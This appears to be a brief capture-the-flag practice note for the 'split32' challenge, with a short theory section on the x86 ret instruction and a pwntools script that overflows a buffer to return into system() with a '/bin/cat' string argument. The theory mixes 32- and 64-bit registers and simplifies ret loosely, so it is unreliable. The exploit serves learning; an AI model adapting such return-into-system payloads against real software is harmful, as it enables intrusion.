# Theory
- When `ret` instruction is executed, whatever `eip` points to whatever `esp` is holding (whatever is at the top of the stack) and `rsp` is incremented by 1 memory cell 
- `ret` is basically
    - pop rcx
    - jmp rcx

# Exploit

```python
#!/bin/python
from pwn import *


# system('/bin/cat')
system_addr = p32(0x0804861a)
bin_cat_str = p32(0x0804a030)


payload = b'A' * 44 
payload += system_addr
payload += bin_cat_str

target = process('./split32')
#target.recvuntil(b'> ')
target.send(payload)
print(target.recv())
target.interactive()
```